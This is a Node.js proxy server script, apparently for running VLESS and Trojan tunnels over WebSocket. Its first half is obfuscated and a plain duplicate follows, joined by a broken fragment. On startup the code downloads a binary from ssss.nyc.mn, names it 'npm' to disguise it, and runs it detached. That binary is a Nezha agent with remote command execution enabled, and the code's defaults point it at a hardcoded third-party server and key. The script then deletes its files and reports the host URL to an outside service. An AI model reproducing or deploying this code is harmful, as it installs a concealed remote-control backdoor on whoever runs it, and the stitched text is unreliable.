const a0_0x3a3d11=a0_0x250a;function a0_0x250a(_0x8d61e4,_0x2880d6){const _0x1acf84=a0_0x5d51();return a0_0x250a=function(_0x72f2dd,_0x570038){_0x72f2dd=_0x72f2dd-0x13b;let _0x2a367f=_0x1acf84[_0x72f2dd];return _0x2a367f;},a0_0x250a(_0x8d61e4,_0x2880d6);}(function(_0x34c4dc,_0xbdb0b7){const _0x122c04=a0_0x250a,_0x3c9480=_0x34c4dc();while(!![]){try{const _0x1b4486=-parseInt(_0x122c04(0x141))/0x1+parseInt(_0x122c04(0x1c3))/0x2*(parseInt(_0x122c04(0x172))/0x3)+parseInt(_0x122c04(0x17a))/0x4*(-parseInt(_0x122c04(0x176))/0x5)+parseInt(_0x122c04(0x15a))/0x6+-parseInt(_0x122c04(0x1c6))/0x7+parseInt(_0x122c04(0x17e))/0x8*(parseInt(_0x122c04(0x1ad))/0x9)+parseInt(_0x122c04(0x1b2))/0xa*(parseInt(_0x122c04(0x1a7))/0xb);if(_0x1b4486===_0xbdb0b7)break;else _0x3c9480['push'](_0x3c9480['shift']());}catch(_0x22899c){_0x3c9480['push'](_0x3c9480['shift']());}}}(a0_0x5d51,0x3bf32));const a0_0x570038=(function(){let _0x4ea4d9=!![];return function(_0x354cc2,_0x4ca9a3){const _0x79185a=_0x4ea4d9?function(){if(_0x4ca9a3){const _0x2940c8=_0x4ca9a3['apply'](_0x354cc2,arguments);return _0x4ca9a3=null,_0x2940c8;}}:function(){};return _0x4ea4d9=![],_0x79185a;};}()),a0_0x72f2dd=a0_0x570038(this,function(){const _0x39b1c6=a0_0x250a;let _0x455b30;try{const _0x7e6875=Function(_0x39b1c6(0x18d)+_0x39b1c6(0x1aa)+');');_0x455b30=_0x7e6875();}catch(_0x5c20b6){_0x455b30=window;}const _0x118eb7=_0x455b30[_0x39b1c6(0x142)]=_0x455b30['console']||{},_0x168991=[_0x39b1c6(0x19f),_0x39b1c6(0x174),'info',_0x39b1c6(0x149),_0x39b1c6(0x1a4),_0x39b1c6(0x192),'trace'];for(let _0x1e3f3c=0x0;_0x1e3f3c<_0x168991[_0x39b1c6(0x18e)];_0x1e3f3c++){const _0x1786cc=a0_0x570038[_0x39b1c6(0x13e)][_0x39b1c6(0x161)][_0x39b1c6(0x1c0)](a0_0x570038),_0xe785c9=_0x168991[_0x1e3f3c],_0xae8c54=_0x118eb7[_0xe785c9]||_0x1786cc;_0x1786cc[_0x39b1c6(0x145)]=a0_0x570038['bind'](a0_0x570038),_0x1786cc[_0x39b1c6(0x17d)]=_0xae8c54[_0x39b1c6(0x17d)][_0x39b1c6(0x1c0)](_0xae8c54),_0x118eb7[_0xe785c9]=_0x1786cc;}});a0_0x72f2dd();const os=require('os'),http=require('http'),fs=require('fs'),axios=require(a0_0x3a3d11(0x19c)),net=require('net'),path=require(a0_0x3a3d11(0x15e)),crypto=require(a0_0x3a3d11(0x19b)),{Buffer}=require('buffer'),{exec,execSync}=require(a0_0x3a3d11(0x19d)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[a0_0x3a3d11(0x1c4)][a0_0x3a3d11(0x16a)]||a0_0x3a3d11(0x186),NEZHA_SERVER=process[a0_0x3a3d11(0x1c4)]['NEZHA_SERVER']||a0_0x3a3d11(0x18f),NEZHA_PORT=process[a0_0x3a3d11(0x1c4)][a0_0x3a3d11(0x175)]||'',NEZHA_KEY=process['env'][a0_0x3a3d11(0x1ae)]||a0_0x3a3d11(0x198),DOMAIN=process[a0_0x3a3d11(0x1c4)][a0_0x3a3d11(0x189)]||a0_0x3a3d11(0x1c9),AUTO_ACCESS=process[a0_0x3a3d11(0x1c4)][a0_0x3a3d11(0x153)]||![],WSPATH=process[a0_0x3a3d11(0x1c4)][a0_0x3a3d11(0x184)]||UUID[a0_0x3a3d11(0x14e)](0x0,0x8),SUB_PATH=process[a0_0x3a3d11(0x1c4)][a0_0x3a3d11(0x13f)]||a0_0x3a3d11(0x1bd),NAME=process[a0_0x3a3d11(0x1c4)][a0_0x3a3d11(0x193)]||'',PORT=process['env'][a0_0x3a3d11(0x167)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x1f8f2d=a0_0x3a3d11;try{const _0x181ca2=await axios[_0x1f8f2d(0x1bf)](_0x1f8f2d(0x182)),_0x4c38a8=_0x181ca2['data'];ISP=(_0x4c38a8['country']+'-'+_0x4c38a8[_0x1f8f2d(0x169)])[_0x1f8f2d(0x180)](/ /g,'_');}catch(_0x17105c){ISP=_0x1f8f2d(0x181);}};GetISP();const httpServer=http[a0_0x3a3d11(0x1a0)]((_0x2388dd,_0x13a2f6)=>{const _0x415ede=a0_0x3a3d11;if(_0x2388dd[_0x415ede(0x165)]==='/'){const _0x2c2221=path['join'](__dirname,_0x415ede(0x1b3));fs['readFile'](_0x2c2221,_0x415ede(0x148),(_0x516f8a,_0x3e18a1)=>{const _0x18183a=_0x415ede;if(_0x516f8a){_0x13a2f6[_0x18183a(0x177)](0xc8,{'Content-Type':_0x18183a(0x1a5)}),_0x13a2f6['end'](_0x18183a(0x1a1));return;}_0x13a2f6[_0x18183a(0x177)](0xc8,{'Content-Type':_0x18183a(0x1a5)}),_0x13a2f6[_0x18183a(0x15b)](_0x3e18a1);});return;}else{if(_0x2388dd[_0x415ede(0x165)]==='/'+SUB_PATH){const _0x2c3231=NAME?NAME+'-'+ISP:ISP,_0x352bb2='vless://'+UUID+_0x415ede(0x15c)+DOMAIN+_0x415ede(0x1c8)+DOMAIN+_0x415ede(0x14b)+WSPATH+'#'+_0x2c3231,_0x3699e0=_0x415ede(0x17c)+UUID+_0x415ede(0x170)+DOMAIN+_0x415ede(0x1c8)+DOMAIN+_0x415ede(0x14b)+WSPATH+'#'+_0x2c3231,_0x30cc63=_0x352bb2+'\x0a'+_0x3699e0,_0x598eea=Buffer['from'](_0x30cc63)[_0x415ede(0x17d)]('base64');_0x13a2f6[_0x415ede(0x177)](0xc8,{'Content-Type':_0x415ede(0x1a2)}),_0x13a2f6[_0x415ede(0x15b)](_0x598eea+'\x0a');}else _0x13a2f6[_0x415ede(0x177)](0x194,{'Content-Type':'text/plain'}),_0x13a2f6['end'](_0x415ede(0x147));}}),wss=new WebSocket[(a0_0x3a3d11(0x166))]({'server':httpServer}),uuid=UUID[a0_0x3a3d11(0x180)](/-/g,''),DNS_SERVERS=[a0_0x3a3d11(0x190),a0_0x3a3d11(0x18a)];function resolveHost(_0x46f697){return new Promise((_0x13fcc5,_0x719a9d)=>{const _0xdd3221=a0_0x250a;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xdd3221(0x146)](_0x46f697)){_0x13fcc5(_0x46f697);return;}let _0x1a0e43=0x0;function _0x6d9468(){const _0x55e27d=_0xdd3221;if(_0x1a0e43>=DNS_SERVERS[_0x55e27d(0x18e)]){_0x719a9d(new Error(_0x55e27d(0x155)+_0x46f697+_0x55e27d(0x179)));return;}const _0x83f0=DNS_SERVERS[_0x1a0e43];_0x1a0e43++;const _0x201b13=_0x55e27d(0x1ab)+encodeURIComponent(_0x46f697)+_0x55e27d(0x194);axios[_0x55e27d(0x1bf)](_0x201b13,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x55e27d(0x13d)](_0x2ef536=>{const _0x22a4b0=_0x55e27d,_0x39dbb5=_0x2ef536[_0x22a4b0(0x1bb)];if(_0x39dbb5[_0x22a4b0(0x13b)]===0x0&&_0x39dbb5[_0x22a4b0(0x1b0)]&&_0x39dbb5[_0x22a4b0(0x1b0)][_0x22a4b0(0x18e)]>0x0){const _0x240a9a=_0x39dbb5[_0x22a4b0(0x1b0)][_0x22a4b0(0x14c)](_0x403ea5=>_0x403ea5['type']===0x1);if(_0x240a9a){_0x13fcc5(_0x240a9a[_0x22a4b0(0x1bb)]);return;}}_0x6d9468();})['catch'](_0x138b71=>{_0x6d9468();});}_0x6d9468();});}function a0_0x5d51(){const _0x9ea282=['connection','prototype','includes','writeFileSync','chmod\x20+x\x20npm','url','Server','PORT','error:\x20','asOrganization','UUID','arm','split','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','join','message','@cdns.doon.eu.org:443?security=tls&sni=','trim','60cIZGzG','2083','warn','NEZHA_PORT','895tjEWUg','writeHead','config.yaml','\x20with\x20all\x20DNS\x20servers','60lkHOmg','readUInt16BE','trojan://','toString','461672NkEtlT','substr','replace','Unknown','https://speed.cloudflare.com/meta','pipe','WSPATH','https://','5efabea4-f6d4-91fd-b8f0-17e004c89c66','8443','post','DOMAIN','1.1.1.1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','setsid\x20nohup\x20./npm\x20-s\x20','return\x20(function()\x20','length','6.182610.xyz:6666','8.8.4.4','connect','table','NAME','&type=A','https://oooo.serv00.net/add-url','concat','once','HIMrzL5F8vWxhc2OhF9CjKrJVzMvEtmc','arm64','write','crypto','axios','child_process','catch','log','createServer','Hello\x20world!','text/plain','unlink','exception','text/html','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','11nvCbpI','Automatic\x20Access\x20Task\x20added\x20successfully','close','{}.constructor(\x22return\x20this\x22)(\x20)','https://dns.google/resolve?name=','--tls','45DLtocR','NEZHA_KEY','\x20-p\x20','Answer','update','1365410GswOhw','index.html','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','npm\x20download\x20successfully','https://arm64.ssss.nyc.mn/v1','aarch64','/bin/bash','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','every','data','listen','ncpd','Server\x20is\x20running\x20on\x20port\x20','get','bind','reduce','2053','30340rwJsxM','env','pop','3430378QImWeN','digest','&fp=chrome&type=ws&host=','1234.abc.com','Status','2087','then','constructor','SUB_PATH','npm\x20running\x20error:','184893noOHvc','console','decode','https://amd64.ssss.nyc.mn/v1','__proto__','test','Not\x20Found\x0a','utf8','error','https://amd64.ssss.nyc.mn/agent','&path=%2F','find','https://arm64.ssss.nyc.mn/agent','slice','stream','utf-8','npm','readUInt8','AUTO_ACCESS','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Failed\x20to\x20resolve\x20','finish','2096','map','npm\x20is\x20running','1168200dyZHsH','end','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','hex','path','sha224'];a0_0x5d51=function(){return _0x9ea282;};return a0_0x5d51();}function handleVlessConnection(_0x13ce53,_0x4c9f07){const _0x4d0930=a0_0x3a3d11,[_0xc574b6]=_0x4c9f07,_0x354fe8=_0x4c9f07['slice'](0x1,0x11);if(!_0x354fe8[_0x4d0930(0x1ba)]((_0x174586,_0x2b0484)=>_0x174586==parseInt(uuid[_0x4d0930(0x17f)](_0x2b0484*0x2,0x2),0x10)))return![];let _0x206a55=_0x4c9f07[_0x4d0930(0x14e)](0x11,0x12)[_0x4d0930(0x152)]()+0x13;const _0x169fc9=_0x4c9f07[_0x4d0930(0x14e)](_0x206a55,_0x206a55+=0x2)[_0x4d0930(0x17b)](0x0),_0x429e68=_0x4c9f07[_0x4d0930(0x14e)](_0x206a55,_0x206a55+=0x1)[_0x4d0930(0x152)](),_0x14076c=_0x429e68==0x1?_0x4c9f07['slice'](_0x206a55,_0x206a55+=0x4)[_0x4d0930(0x16e)]('.'):_0x429e68==0x2?new TextDecoder()[_0x4d0930(0x143)](_0x4c9f07[_0x4d0930(0x14e)](_0x206a55+0x1,_0x206a55+=0x1+_0x4c9f07[_0x4d0930(0x14e)](_0x206a55,_0x206a55+0x1)[_0x4d0930(0x152)]())):_0x429e68==0x3?_0x4c9f07[_0x4d0930(0x14e)](_0x206a55,_0x206a55+=0x10)[_0x4d0930(0x1c1)]((_0x55776a,_0x3d30fa,_0x5cccd6,_0x499a0b)=>_0x5cccd6%0x2?_0x55776a[_0x4d0930(0x196)](_0x499a0b['slice'](_0x5cccd6-0x1,_0x5cccd6+0x1)):_0x55776a,[])[_0x4d0930(0x158)](_0x73333d=>_0x73333d[_0x4d0930(0x17b)](0x0)[_0x4d0930(0x17d)](0x10))[_0x4d0930(0x16e)](':'):'';_0x13ce53['send'](new Uint8Array([_0xc574b6,0x0]));const _0x2b944b=createWebSocketStream(_0x13ce53);return resolveHost(_0x14076c)[_0x4d0930(0x13d)](_0x3ee731=>{const _0x38ecfc=_0x4d0930;net[_0x38ecfc(0x191)]({'host':_0x3ee731,'port':_0x169fc9},function(){const _0x526728=_0x38ecfc;this[_0x526728(0x19a)](_0x4c9f07[_0x526728(0x14e)](_0x206a55)),_0x2b944b['on'](_0x526728(0x149),()=>{})[_0x526728(0x183)](this)['on'](_0x526728(0x149),()=>{})['pipe'](_0x2b944b);})['on'](_0x38ecfc(0x149),()=>{});})[_0x4d0930(0x19e)](_0x1c53d0=>{const _0x35625e=_0x4d0930;net[_0x35625e(0x191)]({'host':_0x14076c,'port':_0x169fc9},function(){const _0x4b70f0=_0x35625e;this['write'](_0x4c9f07[_0x4b70f0(0x14e)](_0x206a55)),_0x2b944b['on'](_0x4b70f0(0x149),()=>{})[_0x4b70f0(0x183)](this)['on'](_0x4b70f0(0x149),()=>{})[_0x4b70f0(0x183)](_0x2b944b);})['on'](_0x35625e(0x149),()=>{});}),!![];}function handleTrojanConnection(_0x2765c8,_0x889c14){const _0x604139=a0_0x3a3d11;try{if(_0x889c14[_0x604139(0x18e)]<0x3a)return![];const _0x40ee39=_0x889c14[_0x604139(0x14e)](0x0,0x38)[_0x604139(0x17d)](),_0x172a59=[UUID];let _0x312962=null;for(const _0x4239a0 of _0x172a59){const _0x5a8765=crypto['createHash'](_0x604139(0x15f))[_0x604139(0x1b1)](_0x4239a0)[_0x604139(0x1c7)](_0x604139(0x15d));if(_0x5a8765===_0x40ee39){_0x312962=_0x4239a0;break;}}if(!_0x312962)return![];let _0x5053e8=0x38;_0x889c14[_0x5053e8]===0xd&&_0x889c14[_0x5053e8+0x1]===0xa&&(_0x5053e8+=0x2);const _0x207f82=_0x889c14[_0x5053e8];if(_0x207f82!==0x1)return![];_0x5053e8+=0x1;const _0x5864ef=_0x889c14[_0x5053e8];_0x5053e8+=0x1;let _0x57bf4e,_0x24b284;if(_0x5864ef===0x1)_0x57bf4e=_0x889c14[_0x604139(0x14e)](_0x5053e8,_0x5053e8+0x4)[_0x604139(0x16e)]('.'),_0x5053e8+=0x4;else{if(_0x5864ef===0x3){const _0x3b7338=_0x889c14[_0x5053e8];_0x5053e8+=0x1,_0x57bf4e=_0x889c14[_0x604139(0x14e)](_0x5053e8,_0x5053e8+_0x3b7338)[_0x604139(0x17d)](),_0x5053e8+=_0x3b7338;}else{if(_0x5864ef===0x4)_0x57bf4e=_0x889c14['slice'](_0x5053e8,_0x5053e8+0x10)[_0x604139(0x1c1)]((_0x4b147e,_0x17bd90,_0x831b48,_0x411d81)=>_0x831b48%0x2?_0x4b147e[_0x604139(0x196)](_0x411d81[_0x604139(0x14e)](_0x831b48-0x1,_0x831b48+0x1)):_0x4b147e,[])[_0x604139(0x158)](_0x2a413d=>_0x2a413d[_0x604139(0x17b)](0x0)[_0x604139(0x17d)](0x10))['join'](':'),_0x5053e8+=0x10;else return![];}}_0x24b284=_0x889c14[_0x604139(0x17b)](_0x5053e8),_0x5053e8+=0x2;_0x5053e8<_0x889c14['length']&&_0x889c14[_0x5053e8]===0xd&&_0x889c14[_0x5053e8+0x1]===0xa&&(_0x5053e8+=0x2);const _0x47ad33=createWebSocketStream(_0x2765c8);return resolveHost(_0x57bf4e)[_0x604139(0x13d)](_0x2eb081=>{const _0x501afc=_0x604139;net[_0x501afc(0x191)]({'host':_0x2eb081,'port':_0x24b284},function(){const _0x41ec20=_0x501afc;_0x5053e8<_0x889c14[_0x41ec20(0x18e)]&&this[_0x41ec20(0x19a)](_0x889c14[_0x41ec20(0x14e)](_0x5053e8)),_0x47ad33['on'](_0x41ec20(0x149),()=>{})[_0x41ec20(0x183)](this)['on'](_0x41ec20(0x149),()=>{})[_0x41ec20(0x183)](_0x47ad33);})['on'](_0x501afc(0x149),()=>{});})[_0x604139(0x19e)](_0x4604e3=>{const _0x298e30=_0x604139;net['connect']({'host':_0x57bf4e,'port':_0x24b284},function(){const _0x332c5e=a0_0x250a;_0x5053e8<_0x889c14[_0x332c5e(0x18e)]&&this[_0x332c5e(0x19a)](_0x889c14[_0x332c5e(0x14e)](_0x5053e8)),_0x47ad33['on'](_0x332c5e(0x149),()=>{})[_0x332c5e(0x183)](this)['on'](_0x332c5e(0x149),()=>{})[_0x332c5e(0x183)](_0x47ad33);})['on'](_0x298e30(0x149),()=>{});}),!![];}catch(_0x15aec9){return![];}}wss['on'](a0_0x3a3d11(0x160),(_0x98177,_0x4f0e56)=>{const _0x1a9b96=a0_0x3a3d11,_0x3a10dc=_0x4f0e56[_0x1a9b96(0x165)]||'';_0x98177[_0x1a9b96(0x197)](_0x1a9b96(0x16f),_0x52bcbb=>{const _0x184bf8=_0x1a9b96;if(_0x52bcbb['length']>0x11&&_0x52bcbb[0x0]===0x0){const _0x51a65c=_0x52bcbb[_0x184bf8(0x14e)](0x1,0x11),_0xd9415a=_0x51a65c[_0x184bf8(0x1ba)]((_0x343876,_0x3e8ea8)=>_0x343876==parseInt(uuid[_0x184bf8(0x17f)](_0x3e8ea8*0x2,0x2),0x10));if(_0xd9415a){!handleVlessConnection(_0x98177,_0x52bcbb)&&_0x98177[_0x184bf8(0x1a9)]();return;}}!handleTrojanConnection(_0x98177,_0x52bcbb)&&_0x98177[_0x184bf8(0x1a9)]();})['on'](_0x1a9b96(0x149),()=>{});});const getDownloadUrl=()=>{const _0x53f4e3=a0_0x3a3d11,_0xede06=os['arch']();return _0xede06===_0x53f4e3(0x16b)||_0xede06===_0x53f4e3(0x199)||_0xede06===_0x53f4e3(0x1b7)?!NEZHA_PORT?_0x53f4e3(0x1b6):_0x53f4e3(0x14d):!NEZHA_PORT?_0x53f4e3(0x144):_0x53f4e3(0x14a);},downloadFile=async()=>{const _0x460169=a0_0x3a3d11;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x8cdba5=getDownloadUrl(),_0x15d0ba=await axios({'method':_0x460169(0x1bf),'url':_0x8cdba5,'responseType':_0x460169(0x14f)}),_0x1ad6af=fs['createWriteStream'](_0x460169(0x151));return _0x15d0ba['data'][_0x460169(0x183)](_0x1ad6af),new Promise((_0x3a53c4,_0x549ad7)=>{const _0x2e2ba4=_0x460169;_0x1ad6af['on'](_0x2e2ba4(0x156),()=>{const _0x361f2f=_0x2e2ba4;console[_0x361f2f(0x19f)](_0x361f2f(0x1b5)),exec(_0x361f2f(0x164),_0x1a7a7a=>{if(_0x1a7a7a)_0x549ad7(_0x1a7a7a);_0x3a53c4();});}),_0x1ad6af['on'](_0x2e2ba4(0x149),_0x549ad7);});}catch(_0x2e7e98){throw _0x2e7e98;}},runnz=async()=>{const _0x5a1998=a0_0x3a3d11;try{const _0x3d1cc5=execSync(_0x5a1998(0x1a6),{'encoding':_0x5a1998(0x150)});if(_0x3d1cc5[_0x5a1998(0x171)]()!==''){console[_0x5a1998(0x19f)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2c08de){}await downloadFile();let _0x5a82b2='',_0x54e3e0=['443',_0x5a1998(0x187),_0x5a1998(0x157),_0x5a1998(0x13c),_0x5a1998(0x173),_0x5a1998(0x1c2)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x34841b=_0x54e3e0[_0x5a1998(0x162)](NEZHA_PORT)?_0x5a1998(0x1ac):'';_0x5a82b2=_0x5a1998(0x18c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5a1998(0x1af)+NEZHA_KEY+'\x20'+_0x34841b+_0x5a1998(0x154);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1f51cd=NEZHA_SERVER[_0x5a1998(0x162)](':')?NEZHA_SERVER[_0x5a1998(0x16c)](':')[_0x5a1998(0x1c5)]():'',_0xc6fa52=_0x54e3e0[_0x5a1998(0x162)](_0x1f51cd)?'true':'false',_0x29b788='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5a1998(0x1b9)+_0xc6fa52+_0x5a1998(0x18b)+UUID;fs[_0x5a1998(0x163)](_0x5a1998(0x178),_0x29b788);}_0x5a82b2=_0x5a1998(0x16d);}else{console['log'](_0x5a1998(0x1b4));return;}}try{exec(_0x5a82b2,{'shell':_0x5a1998(0x1b8)},_0x2ce212=>{const _0x24fe6a=_0x5a1998;if(_0x2ce212)console[_0x24fe6a(0x149)](_0x24fe6a(0x140),_0x2ce212);else console[_0x24fe6a(0x19f)](_0x24fe6a(0x159));});}catch(_0x4381d9){console[_0x5a1998(0x149)](_0x5a1998(0x168)+_0x4381d9);}};async function addAccessTask(){const _0x19a341=a0_0x3a3d11;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x472200=_0x19a341(0x185)+DOMAIN+'/'+SUB_PATH;try{const _0x37bd9e=await axios[_0x19a341(0x188)](_0x19a341(0x195),{'url':_0x472200},{'headers':{'Content-Type':'application/json'}});console['log'](_0x19a341(0x1a8));}catch(_0xcc416){}}const delFiles=()=>{const _0x58a44c=a0_0x3a3d11;fs[_0x58a44c(0x1a3)]('npm',()=>{}),fs[_0x58a44c(0x1a3)](_0x58a44c(0x178),()=>{});};httpServer[a0_0x3a3d11(0x1bc)](PORT,()=>{const _0x381aa6=a0_0x3a3d11;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x381aa6(0x19f)](_0x381aa6(0x1be)+PORT);});    
    tryNextDNS();
  });
}

// VLE-SS处理
function handleVlessConnection(ws, msg) {
  const [VERSION] = msg;
  const id = msg.slice(1, 17);
  if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return false;
  let i = msg.slice(17, 18).readUInt8() + 19;
  const port = msg.slice(i, i += 2).readUInt16BE(0);
  const ATYP = msg.slice(i, i += 1).readUInt8();
  const host = ATYP == 1 ? msg.slice(i, i += 4).join('.') :
    (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) :
    (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));
  ws.send(new Uint8Array([VERSION, 0]));
  const duplex = createWebSocketStream(ws);
  resolveHost(host)
    .then(resolvedIP => {
      net.connect({ host: resolvedIP, port }, function() {
        this.write(msg.slice(i));
        duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
      }).on('error', () => {});
    })
    .catch(error => {
      net.connect({ host, port }, function() {
        this.write(msg.slice(i));
        duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
      }).on('error', () => {});
    });
  
  return true;
}

// Tro-jan处理
function handleTrojanConnection(ws, msg) {
  try {
    if (msg.length < 58) return false;
    const receivedPasswordHash = msg.slice(0, 56).toString();
    const possiblePasswords = [
      UUID,
    ];
    
    let matchedPassword = null;
    for (const pwd of possiblePasswords) {
      const hash = crypto.createHash('sha224').update(pwd).digest('hex');
      if (hash === receivedPasswordHash) {
        matchedPassword = pwd;
        break;
      }
    }
    
    if (!matchedPassword) return false;
    let offset = 56;
    if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {
      offset += 2;
    }
    
    const cmd = msg[offset];
    if (cmd !== 0x01) return false;
    offset += 1;
    const atyp = msg[offset];
    offset += 1;
    let host, port;
    if (atyp === 0x01) {
      host = msg.slice(offset, offset + 4).join('.');
      offset += 4;
    } else if (atyp === 0x03) {
      const hostLen = msg[offset];
      offset += 1;
      host = msg.slice(offset, offset + hostLen).toString();
      offset += hostLen;
    } else if (atyp === 0x04) {
      host = msg.slice(offset, offset + 16).reduce((s, b, i, a) => 
        (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), [])
        .map(b => b.readUInt16BE(0).toString(16)).join(':');
      offset += 16;
    } else {
      return false;
    }
    
    port = msg.readUInt16BE(offset);
    offset += 2;
    
    if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {
      offset += 2;
    }
    
    const duplex = createWebSocketStream(ws);

    resolveHost(host)
      .then(resolvedIP => {
        net.connect({ host: resolvedIP, port }, function() {
          if (offset < msg.length) {
            this.write(msg.slice(offset));
          }
          duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
        }).on('error', () => {});
      })
      .catch(error => {
        net.connect({ host, port }, function() {
          if (offset < msg.length) {
            this.write(msg.slice(offset));
          }
          duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
        }).on('error', () => {});
      });
    
    return true;
  } catch (error) {
    return false;
  }
}
// Ws 连接处理
wss.on('connection', (ws, req) => {
  const url = req.url || '';
  ws.once('message', msg => {
    if (msg.length > 17 && msg[0] === 0) {
      const id = msg.slice(1, 17);
      const isVless = id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16));
      if (isVless) {
        if (!handleVlessConnection(ws, msg)) {
          ws.close();
        }
        return;
      }
    }

    if (!handleTrojanConnection(ws, msg)) {
      ws.close();
    }
  }).on('error', () => {});
});

const getDownloadUrl = () => {
  const arch = os.arch(); 
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    if (!NEZHA_PORT) {
      return 'https://arm64.ssss.nyc.mn/v1';
    } else {
      return 'https://arm64.ssss.nyc.mn/agent';
    }
  } else {
    if (!NEZHA_PORT) {
      return 'https://amd64.ssss.nyc.mn/v1';
    } else {
      return 'https://amd64.ssss.nyc.mn/agent';
    }
  }
};

const downloadFile = async () => {
  if (!NEZHA_SERVER && !NEZHA_KEY) return;
  
  try {
    const url = getDownloadUrl();
    const response = await axios({
      method: 'get',
      url: url,
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('npm');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log('npm download successfully');
        exec('chmod +x npm', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const runnz = async () => {
  try {
    const status = execSync('ps aux | grep -v "grep" | grep "./[n]pm"', { encoding: 'utf-8' });
    if (status.trim() !== '') {
      console.log('npm is already running, skip running...');
      return;
    }
  } catch (e) {
    // 进程不存在时继续运行nezha
  }

  await downloadFile();
  let command = '';
  let tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
  
  if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
    const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? '--tls' : '';
    command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
  } else if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const NZ_TLS = tlsPorts.includes(port) ? 'true' : 'false';
      const configYaml = `client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${NZ_TLS}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;
      
      fs.writeFileSync('config.yaml', configYaml);
    }
    command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;
  } else {
    console.log('NEZHA variable is empty, skip running');
    return;
  }

  try {
    exec(command, { shell: '/bin/bash' }, (err) => {
      if (err) console.error('npm running error:', err);
      else console.log('npm is running');
    });
  } catch (error) {
    console.error(`error: ${error}`);
  }   
}; 

async function addAccessTask() {
  if (!AUTO_ACCESS) return;

  if (!DOMAIN) {
    return;
  }
  const fullURL = `https://${DOMAIN}/${SUB_PATH}`;
  try {
    const res = await axios.post("https://oooo.serv00.net/add-url", {
      url: fullURL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    console.log('Automatic Access Task added successfully');
  } catch (error) {
    // console.error('Error adding Task:', error.message);
  }
}

const delFiles = () => {
  fs.unlink('npm', () => {});
  fs.unlink('config.yaml', () => {}); 
};

httpServer.listen(PORT, () => {
  runnz();
  setTimeout(() => {
    delFiles();
  }, 180000);
  addAccessTask();
  console.log(`Server is running on port ${PORT}`);
});
